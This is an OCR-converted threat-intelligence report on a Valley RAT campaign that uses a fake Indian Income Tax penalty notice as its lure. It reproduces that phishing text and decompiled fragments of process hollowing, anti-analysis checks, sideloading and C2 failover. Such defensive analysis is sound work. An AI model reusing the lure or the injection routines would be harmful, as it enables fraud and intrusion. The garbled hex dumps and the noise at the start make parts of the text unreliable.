/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, 